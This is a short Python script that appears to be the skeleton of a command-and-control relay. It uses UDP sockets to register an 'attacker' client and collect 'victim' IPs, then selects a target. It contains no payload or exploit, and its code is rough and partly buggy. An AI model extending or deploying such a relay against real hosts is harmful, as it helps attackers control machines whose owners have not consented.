import socket
import functions
from threading import Thread


def accept_for_new_victims(server_socket_for_new_users):
    print('waitin for a victim')
    ip = server_socket_for_new_users.recvfrom(1024)[1]
    victims_ip_list.append(ip)
    Thread(target=accept_for_new_victims, args=(socket_for_victims,)).start()


attacket_ip = ''
targeted_victim_ip = ''
victims_ip_list = []

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('0.0.0.0', 42069))

socket_for_victims = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket_for_victims.bind(('0.0.0.0', 4200))

socket_for_attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket_for_attacker.bind(('0.0.0.0', 420))
data, ip = socket_for_attacker.recvfrom(1024)
data = data.decode()
if data == 'i am the attacker':
    print('attacker_conected')
    attacket_ip = ip
Thread(target=accept_for_new_victims, args=(socket_for_victims,)).start()
while not victims_ip_list:
    pass
targeted_victim_ip = victims_ip_list[0]
print(targeted_victim_ip, 'is the target')